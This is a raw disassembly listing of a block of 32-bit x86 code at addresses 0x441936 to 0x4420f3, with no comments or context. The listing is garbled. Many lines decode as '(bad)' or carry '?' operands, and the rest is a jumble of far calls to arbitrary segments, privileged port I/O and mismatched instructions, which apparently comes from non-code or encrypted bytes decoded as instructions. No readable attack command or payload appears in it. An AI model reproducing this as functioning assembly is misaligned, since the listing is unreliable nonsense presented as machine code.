  441936:	shl    BYTE PTR [eax-0x681eeaf0],1
  44193c:	or     DWORD PTR [edi+0x32],ebx
  44193f:	fidiv  DWORD PTR [edx+0x6c56429e]
  441945:	cmp    esp,eax
  441947:	jb     0x4418ea
  441949:	or     eax,DWORD PTR [ebx+0x1d]
  44194c:	adc    eax,0xdad3dc96
  441951:	xor    dl,BYTE PTR [ebp+0x601750ee]
  441957:	mov    bl,0x5d
  441959:	inc    ebx
  44195a:	sub    esp,DWORD PTR [edi+0x849d74d]
  441960:	jcxz   0x44196f
  441963:	test   eax,0x16fcc1c8
  441968:	push   ecx
  441969:	inc    esi
  44196a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44196b:	pop    DWORD PTR [edx]
  44196d:	fcmovnu st,st(5)
  44196f:	(bad)  
  441970:	mov    edx,DWORD PTR [ecx]
  441972:	sti    
  441973:	lahf   
  441974:	sub    eax,0xb32fe90b
  441979:	(bad)  
  44197a:	cs push edx
  44197c:	mov    ebx,0x52d8c20b
  441981:	in     eax,dx
  441982:	or     esi,ebp
  441984:	add    eax,0x182b9a1d
  441989:	jnp    0x441991
  44198b:	add    DWORD PTR ds:0x94b44d1a,ebp
  441991:	mov    ebx,0xf922a7ac
  441996:	ins    DWORD PTR es:[edi],dx
  441997:	outs   dx,BYTE PTR ds:[esi]
  441998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44199a:	popf   
  44199b:	mov    ebp,0x830f6b9c
  4419a0:	push   edx
  4419a1:	jb     0x4419ad
  4419a3:	inc    DWORD PTR [ecx+0x559cca27]
  4419a9:	jae    0x2bcfa7e2
  4419af:	ja     0x4419f2
  4419b1:	aas    
  4419b2:	xchg   ebp,eax
  4419b3:	cmp    esp,ecx
  4419b5:	push   esp
  4419b6:	mov    DWORD PTR fs:[edi-0x7d],0xb2f6d97
  4419be:	xlat   BYTE PTR ds:[ebx]
  4419bf:	push   ds
  4419c0:	pop    esi
  4419c1:	pop    eax
  4419c2:	outs   dx,BYTE PTR ds:[esi]
  4419c3:	xchg   edx,eax
  4419c4:	or     eax,0x5bba9a6d
  4419c9:	xchg   esi,esi
  4419cb:	aaa    
  4419cc:	cld    
  4419cd:	mov    ch,0x5c
  4419cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4419d0:	mov    eax,ds:0xee94b668
  4419d5:	xchg   ecx,eax
  4419d6:	(bad)  
  4419d7:	jae    0x4419c4
  4419d9:	scas   eax,DWORD PTR es:[edi]
  4419da:	call   0xc7da:0x58d0fd32
  4419e1:	xchg   ebx,eax
  4419e2:	sub    al,0xa8
  4419e4:	push   esp
  4419e5:	(bad)  
  4419e6:	ins    BYTE PTR es:[edi],dx
  4419e7:	xchg   edx,eax
  4419e8:	mov    dl,0x51
  4419ea:	mov    esp,esi
  4419ec:	or     esp,esp
  4419ee:	call   0xb02d:0x6b33d02
  4419f5:	popf   
  4419f6:	test   bh,dl
  4419f8:	xor    ecx,DWORD PTR [edx]
  4419fa:	fidivr WORD PTR [esi+0x20]
  4419fd:	sub    esp,eax
  4419ff:	push   0xb4d3cb9d
  441a04:	les    ebx,FWORD PTR [esi+0x204a2b9a]
  441a0a:	lahf   
  441a0b:	or     al,0x18
  441a0d:	cli    
  441a0e:	adc    BYTE PTR [edi+0x78dc4559],ah
  441a14:	(bad)  
  441a15:	std    
  441a16:	pop    esp
  441a17:	out    dx,al
  441a18:	mov    dl,0x5f
  441a1a:	sbb    bh,cl
  441a1c:	call   0x36e5:0x9cf4078d
  441a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441a24:	adc    eax,0x5769da73
  441a29:	pusha  
  441a2a:	cmc    
  441a2b:	add    eax,0x9cc8aab2
  441a30:	jmp    0x441a12
  441a32:	cmp    ch,BYTE PTR [ebx+edx*8]
  441a35:	or     ch,ah
  441a37:	adc    eax,0xa57974ae
  441a3c:	ret    
  441a3d:	retf   
  441a3e:	inc    esi
  441a3f:	sub    esi,DWORD PTR [edx+0x3fd9f8d]
  441a45:	(bad)  [eax+0x9]
  441a48:	add    BYTE PTR [bx+di+0x16f],ah
  441a4d:	neg    BYTE PTR ds:0x279bb30f
  441a53:	push   cs
  441a54:	push   ss
  441a55:	or     BYTE PTR [edx+0x23997d89],bl
  441a5b:	push   ecx
  441a5c:	loope  0x4419ed
  441a5e:	mov    edx,0xdca1dca7
  441a63:	pop    ds
  441a64:	inc    esi
  441a65:	stc    
  441a66:	in     al,dx
  441a67:	inc    BYTE PTR [ebx+ecx*8-0x66]
  441a6b:	stc    
  441a6c:	push   esi
  441a6d:	sbb    al,0x64
  441a6f:	adc    al,0xa9
  441a71:	adc    cl,dl
  441a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441a74:	shl    DWORD PTR [edx],0xd9
  441a77:	fimul  WORD PTR [ebp+0x5a]
  441a7a:	or     DWORD PTR [esi+0x27462c8b],esi
  441a80:	pop    ebp
  441a81:	std    
  441a82:	push   0xffffffa6
  441a84:	jb     0x441a37
  441a86:	xchg   BYTE PTR [ebx+0x48],al
  441a89:	or     BYTE PTR [edx-0x4708436],dl
  441a8f:	or     dh,BYTE PTR es:[edx+ebp*4-0xb1974f8]
  441a97:	daa    
  441a98:	(bad)  
  441a99:	jb     0x441a30
  441a9b:	stos   DWORD PTR es:[edi],eax
  441a9c:	sahf   
  441a9d:	scas   al,BYTE PTR es:[edi]
  441a9e:	jo     0x441a47
  441aa0:	jp     0x441b16
  441aa2:	mov    ah,0x9e
  441aa4:	and    ebx,DWORD PTR gs:[esi]
  441aa7:	jbe    0x441a5b
  441aa9:	out    0x5e,eax
  441aab:	std    
  441aac:	cmp    DWORD PTR [eax+ebx*2-0xb],ebx
  441ab0:	(bad)  
  441ab1:	xor    DWORD PTR [ebp+0x7a013224],esp
  441ab7:	inc    ebp
  441ab8:	je     0x441adb
  441aba:	call   0x5658a7b0
  441abf:	daa    
  441ac0:	ret    0x2ede
  441ac3:	ds in  eax,0x18
  441ac6:	dec    ecx
  441ac7:	pop    edi
  441ac8:	mov    bh,0xb
  441aca:	mov    bh,0x4d
  441acc:	or     BYTE PTR [ebp+0x36],dl
  441acf:	mov    BYTE PTR [ebx],bl
  441ad1:	jg     0x441a6d
  441ad3:	and    al,0xea
  441ad5:	or     ebx,ecx
  441ad7:	mov    bl,0x5d
  441ad9:	inc    edi
  441ada:	ds mov ecx,0xa70dbbae
  441ae0:	loopne 0x441a93
  441ae2:	int3   
  441ae3:	mov    dh,0xce
  441ae5:	fistp  DWORD PTR [ebp-0xf49582c]
  441aeb:	xchg   dx,ax
  441aed:	adc    al,0x80
  441aef:	or     esp,DWORD PTR [ebp-0x55]
  441af2:	aaa    
  441af3:	mov    ch,0x9d
  441af5:	or     edi,DWORD PTR [edi-0x72c2b797]
  441afb:	out    dx,al
  441afc:	cdq    
  441afd:	push   ss
  441afe:	call   0x1ad2:0xbd08e7d3
  441b05:	jno    0x441b7b
  441b07:	scas   al,BYTE PTR es:[edi]
  441b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441b09:	mov    cl,0x3e
  441b0b:	bound  esi,QWORD PTR [edx+0x76f4927d]
  441b11:	ret    
  441b12:	call   0x6746:0xe18e41b4
  441b19:	frstor [ecx-0x59]
  441b1c:	ins    DWORD PTR es:[edi],dx
  441b1d:	je     0x441b78
  441b1f:	jl     0x441ad1
  441b21:	in     eax,0x26
  441b23:	int3   
  441b24:	scas   al,BYTE PTR es:[edi]
  441b25:	inc    esi
  441b26:	sub    BYTE PTR [esi+0x72],ch
  441b29:	dec    ebp
  441b2a:	js     0x441b4f
  441b2c:	inc    ebx
  441b2d:	fld    TBYTE PTR [esi-0x59]
  441b30:	ret    
  441b31:	add    al,0xa
  441b33:	(bad)  
  441b35:	mov    dh,0x2e
  441b37:	xchg   edx,eax
  441b38:	push   eax
  441b39:	adc    al,0xa7
  441b3b:	or     eax,0x1dec273c
  441b40:	mov    bl,0x37
  441b42:	mov    al,0x9
  441b44:	sub    ebp,DWORD PTR [edx+ebp*8+0x4a]
  441b48:	xchg   ebp,eax
  441b49:	or     esi,DWORD PTR [ebx]
  441b4b:	push   0xffffffa5
  441b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441b4e:	inc    esi
  441b4f:	fbstp  TBYTE PTR [esi]
  441b51:	popf   
  441b52:	call   0xb8b7:0x26ece513
  441b59:	push   ds
  441b5a:	mov    esp,0xfa574ea4
  441b5f:	mov    esp,0x35229ee3
  441b64:	cmc    
  441b65:	out    0x9b,al
  441b67:	ror    BYTE PTR [ecx+0x30],0xd4
  441b6b:	mov    al,0x54
  441b6d:	lods   eax,DWORD PTR ds:[esi]
  441b6e:	jbe    0x441b5a
  441b70:	jnp    0x441b7d
  441b72:	imul   edx,DWORD PTR ds:0x50777e3,0x6b87492e
  441b7c:	jmp    0x441bb8
  441b7e:	sbb    ah,BYTE PTR [eax]
  441b80:	push   esi
  441b81:	mov    dl,0xee
  441b83:	bound  esp,QWORD PTR [ebx+0xa]
  441b86:	xor    edx,DWORD PTR [ebx+0x5]
  441b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441b8a:	jp     0x441bcc
  441b8c:	fbstp  TBYTE PTR gs:[ebx-0x88b4d8b]
  441b93:	hlt    
  441b94:	aaa    
  441b95:	mov    dh,0x94
  441b97:	xchg   BYTE PTR [esi+ecx*1+0x33],bl
  441b9b:	push   0x2779c1e8
  441ba0:	shr    DWORD PTR [ecx+eax*1],1
  441ba3:	adc    BYTE PTR [edx+0x50a13c8c],dh
  441ba9:	mov    esi,0xbc7aafa
  441bae:	pop    ebx
  441baf:	mov    ebx,DWORD PTR [ebp+0x53023ded]
  441bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441bb6:	cdq    
  441bb7:	dec    esp
  441bb8:	jno    0x441b4b
  441bba:	push   eax
  441bbb:	lock dec esp
  441bbd:	sti    
  441bbe:	fistp  DWORD PTR [esi+0x68]
  441bc1:	or     esi,DWORD PTR [ebp-0x25]
  441bc4:	or     al,0xc2
  441bc6:	mov    ecx,0x9a6cc7dd
  441bcb:	cmp    eax,0x1e1dd53c
  441bd0:	div    DWORD PTR [ecx]
  441bd2:	cmp    al,0xa9
  441bd4:	add    DWORD PTR ds:0xea52cea5,ebp
  441bda:	ret    0x41e1
  441bdd:	cdq    
  441bde:	popf   
  441bdf:	sbb    al,0x72
  441be1:	push   0x94a2222c
  441be6:	mov    ebx,0xba347e32
  441beb:	lods   al,BYTE PTR ds:[esi]
  441bec:	xor    cl,BYTE PTR [ebp+0x54eb49c6]
  441bf2:	pop    ss
  441bf3:	mov    esi,0x23391db2
  441bf8:	xor    DWORD PTR [ebp+0x3c],ebx
  441bfb:	arpl   WORD PTR [ebp+0xb],di
  441bfe:	xchg   ebp,eax
  441bff:	test   eax,0x9e7d435f
  441c04:	ins    BYTE PTR es:[edi],dx
  441c05:	loop   0x441ba1
  441c07:	sar    ebx,0x25
  441c0a:	(bad)  
  441c0b:	div    esp
  441c0d:	mov    bh,0xb6
  441c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441c10:	iret   
  441c11:	mul    ah
  441c13:	dec    ebx
  441c14:	or     dh,BYTE PTR ds:0xdab20908
  441c1a:	int3   
  441c1b:	xchg   ecx,eax
  441c1c:	mov    ds:0xb5fd623b,eax
  441c21:	jecxz  0x441bec
  441c23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441c24:	stc    
  441c25:	pop    ecx
  441c26:	dec    edi
  441c27:	sbb    eax,0x247ac04f
  441c2c:	mov    ch,0xe2
  441c2e:	jmp    0x8a99bc41
  441c33:	mov    ebx,0xa41b6568
  441c38:	imul   esp,DWORD PTR [edi+0x10],0x9b030a3
  441c3f:	ins    BYTE PTR es:[edi],dx
  441c40:	jp     0x441c3b
  441c42:	xor    al,0xa6
  441c44:	mov    bl,0x7a
  441c46:	mul    DWORD PTR [ecx]
  441c48:	test   eax,0x7e1b226a
  441c4d:	pushf  
  441c4e:	xor    DWORD PTR [edi+0x2fa56244],esp
  441c54:	inc    ecx
  441c55:	stos   BYTE PTR es:[edi],al
  441c56:	push   ebp
  441c57:	dec    ecx
  441c58:	ret    
  441c59:	cmc    
  441c5a:	cdq    
  441c5b:	sar    DWORD PTR [esi+0x6d],cl
  441c5e:	dec    edi
  441c5f:	mov    esp,0xb65ac7c5
  441c64:	stc    
  441c65:	bound  ecx,QWORD PTR [ebx-0x72f4f328]
  441c6b:	dec    esp
  441c6c:	int    0xe2
  441c6e:	sub    BYTE PTR [esi+edx*4],bh
  441c71:	adc    BYTE PTR [ebp+edi*8-0x17cf4940],dl
  441c78:	pop    es
  441c79:	jmp    0x441cd8
  441c7b:	int3   
  441c7c:	jns    0x441cc1
  441c7e:	dec    eax
  441c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441c80:	(bad)  
  441c81:	and    DWORD PTR [esi+ecx*8+0x13dea093],ebx
  441c88:	mov    dl,0xf1
  441c8a:	jmp    0xe643:0xc69a4bc5
  441c91:	jno    0x441c1a
  441c93:	fidiv  DWORD PTR [esi]
  441c95:	or     ecx,DWORD PTR [ebx-0x73]
  441c98:	mov    cl,0x62
  441c9a:	shl    DWORD PTR [eax+0x15946373],1
  441ca0:	inc    eax
  441ca1:	xchg   edx,eax
  441ca2:	es test eax,0x6b930b0d
  441ca8:	cmp    ecx,DWORD PTR [edi]
  441caa:	jne    0x441c53
  441cac:	jo     0x441cd8
  441cae:	outs   dx,DWORD PTR ds:[esi]
  441caf:	xchg   esp,eax
  441cb0:	lods   eax,DWORD PTR ds:[esi]
  441cb1:	iret   
  441cb2:	xchg   BYTE PTR [eax],dh
  441cb4:	mov    dl,0xd0
  441cb6:	stos   DWORD PTR es:[edi],eax
  441cb7:	jo     0x441cd9
  441cb9:	shr    BYTE PTR ss:[eax-0x6e],1
  441cbd:	or     al,0x50
  441cbf:	sbb    BYTE PTR [edi+0x3d86b67d],ch
  441cc5:	hlt    
  441cc6:	mov    ebp,0x9ab88043
  441ccb:	add    edi,ebp
  441ccd:	data16 ja 0x441c5d
  441cd0:	jp     0x441d1d
  441cd2:	pop    edi
  441cd3:	mov    ds:0xa987076e,eax
  441cd8:	ror    ebx,1
  441cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441cdb:	jge    0x441cf3
  441cdd:	ret    0xc197
  441ce0:	scas   al,BYTE PTR es:[edi]
  441ce1:	mov    cx,WORD PTR [ebx+0x10782135]
  441ce8:	repnz mov ebx,0x42cbf07f
  441cee:	call   0x9f9:0xb71cabae
  441cf5:	xchg   esp,eax
  441cf6:	(bad)  
  441cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441cf8:	cmp    bl,BYTE PTR [edx+0x78a1a090]
  441cfe:	bnd jnp 0x441d3f
  441d01:	test   BYTE PTR [ebx+eiz*2+0x23d5430e],dl
  441d08:	ja     0x441d4a
  441d0a:	pop    ecx
  441d0b:	adc    BYTE PTR [ebp-0xd],0xf0
  441d0f:	(bad)  
  441d10:	mov    bl,0xb
  441d12:	mov    ch,0xbd
  441d14:	daa    
  441d15:	repnz push ebx
  441d17:	xchg   DWORD PTR [edi],edi
  441d19:	aad    0x9a
  441d1b:	loop   0x441d7c
  441d1d:	jbe    0x441caf
  441d1f:	or     BYTE PTR [esi+0x13a673be],dl
  441d25:	push   eax
  441d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441d27:	push   eax
  441d28:	jecxz  0x441d7c
  441d2a:	dec    edi
  441d2b:	inc    ebx
  441d2c:	xor    DWORD PTR [ebp-0x6d],esp
  441d2f:	popf   
  441d30:	aam    0xd6
  441d32:	call   0x1500616
  441d37:	xchg   edx,eax
  441d38:	jnp    0x441d51
  441d3a:	pop    es
  441d3b:	mov    eax,0x4791a20d
  441d40:	test   BYTE PTR [eax],ch
  441d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441d44:	jne    0x441cee
  441d46:	push   eax
  441d47:	mov    esp,ebx
  441d49:	or     ebp,DWORD PTR [ebp-0xaef0bbc]
  441d4f:	dec    BYTE PTR [ecx+0x5f]
  441d52:	call   0x4c46:0x9eedfefb
  441d59:	and    eax,0xc220a749
  441d5e:	jle    0x441ce0
  441d60:	loope  0x441d48
  441d62:	retf   
  441d63:	test   DWORD PTR [esi+0x31],eax
  441d66:	jo     0x441dd3
  441d68:	mov    ebp,0x66fbb778
  441d6d:	dec    ebx
  441d6e:	mov    al,0xbc
  441d70:	xor    al,0xeb
  441d72:	xor    al,0xa7
  441d74:	cld    
  441d75:	shl    BYTE PTR [ecx],0xd7
  441d78:	adc    al,0xa6
  441d7a:	mov    eax,0x68cdbc74
  441d7f:	(bad)  
  441d80:	xchg   esi,eax
  441d81:	push   esi
  441d82:	pop    edx
  441d83:	js     0x441d93
  441d85:	cmp    BYTE PTR [edi+0x500ba2dd],0x52
  441d8c:	imul   esi,eax,0x52630534
  441d92:	mov    dh,0x9b
  441d94:	pop    ebx
  441d95:	sub    DWORD PTR [eax+0x195b01d6],ebx
  441d9b:	out    0x1b,eax
  441d9d:	pop    ebp
  441d9e:	jecxz  0x441def
  441da0:	push   cs
  441da1:	or     al,0x32
  441da3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441da4:	mov    WORD PTR [edi-0x2c926826],?
  441daa:	jl     0x441de7
  441dac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441dad:	(bad)  
  441dae:	clc    
  441daf:	pop    ecx
  441db0:	add    al,0xb
  441db2:	push   ebx
  441db3:	pop    esi
  441db4:	add    eax,0x1670a831
  441db9:	or     al,0x43
  441dbb:	lea    ebp,[edi+0x22774c8d]
  441dc1:	adc    bp,dx
  441dc4:	shl    BYTE PTR [eax],0x86
  441dc7:	and    ch,bh
  441dc9:	test   al,0x1a
  441dcb:	adc    eax,0x2d49c607
  441dd0:	push   edi
  441dd1:	or     esp,DWORD PTR [edi+0x4749521b]
  441dd7:	jo     0x441dd8
  441dd9:	xor    bl,BYTE PTR [edx+0x6a204c45]
  441ddf:	(bad)  
  441de0:	int    0x97
  441de2:	aaa    
  441de3:	mov    edx,0xe7680ee0
  441de8:	xchg   edx,eax
  441de9:	loope  0x441d97
  441deb:	mov    ah,0xa4
  441ded:	test   cl,ch
  441def:	int    0x4a
  441df1:	push   ebp
  441df2:	call   0x4bf:0x263fbd46
  441df9:	icebp  
  441dfa:	pop    esp
  441dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441dfc:	retf   
  441dfd:	and    DWORD PTR [ebp+eiz*2-0x3c21d52c],edx
  441e04:	mov    dl,0xab
  441e06:	or     eax,ebp
  441e08:	push   esp
  441e09:	clc    
  441e0a:	cwde   
  441e0b:	mov    eax,ds:0xf0960be0
  441e10:	ins    DWORD PTR es:[edi],dx
  441e11:	fmul   QWORD PTR [ebx-0x2b]
  441e14:	iret   
  441e15:	pop    ss
  441e16:	call   0x46e6:0x672c0a99
  441e1d:	mov    ecx,0xcb6ea7cc
  441e22:	fwait
  441e23:	mov    esp,0x5f5e11a4
  441e28:	mov    dl,0x59
  441e2a:	xchg   ebx,eax
  441e2b:	adc    eax,DWORD PTR [ecx+0x5f026015]
  441e31:	or     eax,DWORD PTR [edx]
  441e33:	fstp   DWORD PTR [edx+0x1c]
  441e36:	daa    
  441e37:	call   0xd0dee6e5
  441e3c:	and    esi,DWORD PTR [eax-0x412c1fe7]
  441e42:	and    al,0xa7
  441e44:	xlat   BYTE PTR ds:[ebx]
  441e45:	stc    
  441e46:	ins    BYTE PTR es:[edi],dx
  441e47:	popf   
  441e48:	retf   
  441e49:	int    0x6f
  441e4b:	xchg   ebp,eax
  441e4c:	mov    cl,0x82
  441e4e:	mov    bl,0xf9
  441e50:	nop
  441e51:	dec    ebp
  441e52:	scas   eax,DWORD PTR es:[edi]
  441e53:	inc    edi
  441e54:	push   esi
  441e55:	push   esi
  441e56:	shl    DWORD PTR [edi-0x7f468939],0x7
  441e5d:	cli    
  441e5e:	mov    ch,BYTE PTR [edx+esi*4-0x3d]
  441e62:	fs in  eax,0x23
  441e65:	dec    edx
  441e66:	cmp    al,0xdd
  441e68:	inc    esi
  441e69:	or     ebx,DWORD PTR [ebx+0x1ca73ce4]
  441e6f:	adc    ecx,ebp
  441e71:	jb     0x441ee3
  441e73:	stos   DWORD PTR es:[edi],eax
  441e74:	mov    dl,0x4c
  441e76:	les    ecx,FWORD PTR [edx]
  441e78:	push   ebp
  441e79:	addr16 and al,0xe2
  441e7c:	inc    edx
  441e7d:	or     ebp,DWORD PTR [ebx+0x7c9dd974]
  441e83:	or     bl,0xa2
  441e86:	call   0xc0ad:0xd08d3554
  441e8d:	sub    ebp,DWORD PTR [ecx]
  441e8f:	aam    0xcc
  441e91:	add    eax,0xb0d2096b
  441e96:	call   0xb29a:0xa57a56f2
  441e9d:	dec    ebp
  441e9e:	xlat   BYTE PTR ds:[ebx]
  441e9f:	xor    DWORD PTR [edi-0x67],ecx
  441ea2:	push   esp
  441ea3:	lea    ecx,[ebx+0x4]
  441ea6:	xchg   BYTE PTR [edi-0x573b1e39],al
  441eac:	mov    cl,0xf4
  441eae:	aam    0xc1
  441eb0:	xor    bh,BYTE PTR [eax+0x4990ebd0]
  441eb6:	call   0xde77:0xffc804b7
  441ebd:	pop    DWORD PTR [edx-0x59]
  441ec0:	test   BYTE PTR [ecx+ecx*8],cl
  441ec3:	inc    edx
  441ec4:	mov    cl,0x7b
  441ec6:	sbb    BYTE PTR [eax-0x1e],0xc6
  441eca:	and    eax,DWORD PTR [ebx-0xde9034e]
  441ed0:	pop    eax
  441ed1:	fs aad 0x55
  441ed4:	push   eax
  441ed5:	or     esi,DWORD PTR [esi+0x14fd2cff]
  441edb:	xlat   BYTE PTR ds:[ebx]
  441edc:	xor    eax,0x2a93957d
  441ee1:	paddusw mm4,mm7
  441ee4:	call   0xd90b:0xff82e5c4
  441eeb:	sbb    dh,BYTE PTR [edi]
  441eed:	mov    edi,0x3050caca
  441ef2:	call   0xfabb:0xc0187e29
  441ef9:	cmc    
  441efa:	dec    esi
  441efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441efc:	and    edx,0xffffffaf
  441eff:	inc    edi
  441f00:	(bad)  
  441f01:	pop    esp
  441f02:	push   0x5f
  441f04:	mov    dl,0x48
  441f06:	push   eax
  441f07:	out    0x26,al
  441f09:	mov    dh,0xee
  441f0b:	inc    edx
  441f0c:	dec    ebx
  441f0d:	or     al,0x22
  441f0f:	imul   esi,edi,0x67
  441f12:	loopne 0x441ecd
  441f14:	xor    dl,BYTE PTR [edi-0x3cfb5df7]
  441f1a:	out    dx,al
  441f1b:	and    ch,BYTE PTR [esi-0x4a4d79e1]
  441f21:	dec    ebx
  441f22:	je     0x441eae
  441f24:	(bad)  
  441f25:	loopne 0x441f66
  441f27:	xchg   ecx,eax
  441f28:	mov    ds:0x9867f104,al
  441f2d:	or     bl,dl
  441f2f:	fcomp  QWORD PTR [ebx+esi*4-0x4446fbcf]
  441f36:	fsub   st(5),st
  441f38:	inc    eax
  441f39:	or     cl,BYTE PTR [eax-0x4]
  441f3c:	sub    al,BYTE PTR ds:0x78b05c5e
  441f42:	sbb    al,0xa7
  441f44:	sub    eax,DWORD PTR [ecx-0x1d9674f]
  441f4a:	(bad)  
  441f4b:	cmc    
  441f4c:	add    dl,BYTE PTR [edi-0x6c]
  441f4f:	popa   
  441f50:	inc    edx
  441f51:	jb     0x441f20
  441f53:	inc    edi
  441f54:	stc    
  441f55:	inc    edx
  441f56:	jl     0x441fc4
  441f58:	leave  
  441f59:	or     edi,ebx
  441f5b:	mov    ebx,?
  441f5d:	inc    ebx
  441f5e:	or     ebp,DWORD PTR [ebx-0x11cea3a]
  441f64:	mov    ?,WORD PTR [ebx-0x1a4d210e]
  441f6a:	leave  
  441f6b:	imul   esi,esp,0xffffffc0
  441f6e:	stc    
  441f6f:	jle    0x441fb6
  441f71:	or     ebx,DWORD PTR [edi]
  441f73:	(bad)  
  441f74:	mov    al,ds:0xa98aded5
  441f79:	xchg   edi,eax
  441f7a:	call   0x4e8d:0x17e8233e
  441f81:	cli    
  441f82:	ins    DWORD PTR es:[edi],dx
  441f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441f84:	addr16 xchg esi,eax
  441f86:	adc    al,0x6e
  441f88:	mov    ch,0x79
  441f8a:	or     DWORD PTR [ecx+edi*4-0x727dcdfe],esp
  441f91:	xchg   DWORD PTR [edi+edi*8],esi
  441f94:	sub    ebx,ebp
  441f96:	imul   ebp,DWORD PTR [ecx-0x702990aa],0xb94869b2
  441fa0:	scas   eax,DWORD PTR es:[edi]
  441fa1:	dec    esp
  441fa2:	call   0x9f79:0x5d4dbb55
  441fa9:	mov    al,ds:0xe9e3a7bc
  441fae:	cmc    
  441faf:	push   cs
  441fb0:	out    0xf,al
  441fb2:	and    bh,dl
  441fb4:	mov    dl,0x83
  441fb6:	enter  0xc7be,0xfc
  441fba:	dec    ebx
  441fbb:	inc    ecx
  441fbc:	mov    cs,WORD PTR [ebx]
  441fbe:	ror    BYTE PTR [ebp+0x602a7812],cl
  441fc4:	fcom   DWORD PTR [ecx]
  441fc6:	lds    esp,FWORD PTR [ecx-0x582a54ee]
  441fcc:	test   BYTE PTR [esi+0xa91eb23],ah
  441fd2:	ret    
  441fd3:	mov    edx,0x65808b2
  441fd8:	adc    DWORD PTR ds:0xb1af36c,0x24
  441fdf:	aaa    
  441fe0:	dec    DWORD PTR [edi-0x50]
  441fe3:	mov    esp,DWORD PTR [edx-0x76ce9fc0]
  441fe9:	mov    eax,ds:0xeebd277e
  441fee:	cs jnp 0x442052
  441ff1:	arpl   WORD PTR [eax],di
  441ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441ff4:	jnp    0x442060
  441ff6:	out    dx,al
  441ff7:	push   ebp
  441ff8:	sbb    ebx,ebx
  441ffa:	fdiv   QWORD PTR [ebx]
  441ffc:	mov    dl,0xc6
  441ffe:	add    al,0xe7
  442000:	loopne 0x441f90
  442002:	ret    
  442003:	icebp  
  442004:	xchg   esp,eax
  442005:	or     ah,BYTE PTR [edx+0x72d2d453]
  44200b:	mov    ebx,0x1b4f6be5
  442010:	mov    dl,0x76
  442012:	pop    ebp
  442013:	mov    DWORD PTR [eax-0x23],edi
  442016:	lea    eax,[edi-0x6476f4e6]
  44201c:	pop    ss
  44201d:	jns    0x441ffc
  44201f:	mov    esi,0x599a84d7
  442024:	add    eax,esp
  442026:	xchg   ebx,eax
  442027:	(bad)  [ebx+edi*8-0x4f3958e8]
  44202e:	int    0x88
  442030:	rcr    BYTE PTR [edi+0x5bb20fde],1
  442036:	nop
  442037:	int    0xb3
  442039:	xor    edi,DWORD PTR [edx-0x79]
  44203c:	fisttp QWORD PTR [ebx]
  44203e:	inc    eax
  44203f:	add    dh,BYTE PTR [esp+0x3a]
  442043:	imul   esi,DWORD PTR [ebp-0x2c],0x6b99189a
  44204a:	mov    ecx,0x39e369f
  44204f:	mov    eax,0xa737c2d1
  442054:	mov    WORD PTR [ebx],es
  442056:	shl    cl,cl
  442058:	inc    ebx
  442059:	vpmulhrsw zmm4{k1},zmm0,zmm3
  44205f:	test   ecx,esp
  442061:	ins    BYTE PTR es:[edi],dx
  442062:	and    ebx,edi
  442064:	mov    eax,ds:0x94db200b
  442069:	(bad)  
  44206a:	in     al,dx
  44206b:	inc    edx
  44206c:	hlt    
  44206d:	cmc    
  44206e:	jmp    0x4420db
  442070:	scas   al,BYTE PTR es:[edi]
  442071:	je     0x442054
  442073:	xor    ch,BYTE PTR es:[eax]
  442076:	dec    ebx
  442077:	in     eax,0x4d
  442079:	stos   DWORD PTR es:[edi],eax
  44207a:	cwde   
  44207b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44207c:	lods   al,BYTE PTR ds:[esi]
  44207d:	or     al,0xc8
  44207f:	ja     0x442026
  442081:	jae    0x442072
  442083:	daa    
  442084:	cld    
  442085:	and    al,bh
  442087:	pop    edi
  442088:	pop    edi
  442089:	xor    eax,0xef01a7a2
  44208e:	inc    ecx
  44208f:	dec    eax
  442090:	cli    
  442091:	mov    dl,0x35
  442093:	stos   BYTE PTR es:[edi],al
  442094:	mov    dl,0x8a
  442096:	inc    ebx
  442097:	adc    DWORD PTR [esi+0x4cb46b03],esi
  44209d:	xor    esp,DWORD PTR [ecx-0x64a67702]
  4420a3:	mov    ecx,0x989105a8
  4420a8:	and    DWORD PTR [esi-0xfcd895a],edx
  4420ae:	ret    0x3753
  4420b1:	mov    esp,0x2ffba705
  4420b6:	inc    edi
  4420b7:	repnz lahf 
  4420b9:	ss pop edx
  4420bb:	mov    esp,0xe57128b2
  4420c0:	sbb    al,0xf2
  4420c2:	inc    esp
  4420c3:	jmp    0x476e2c63
  4420c8:	jmp    0x22b3:0xc7c58c9a
  4420cf:	dec    esp
  4420d0:	dec    esi
  4420d1:	popf   
  4420d2:	push   0xffffffdd
  4420d4:	mov    ebx,0x40d16713
  4420d9:	or     edi,DWORD PTR [ebx-0x16845f04]
  4420df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4420e0:	mov    eax,0x792441ad
  4420e5:	pop    es
  4420e6:	inc    eax
  4420e7:	jecxz  0x4420e3
  4420e9:	rcl    BYTE PTR [ecx+0x4606dda7],cl
  4420ef:	aad    0x1d
  4420f1:	or     ecx,ebp
  4420f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
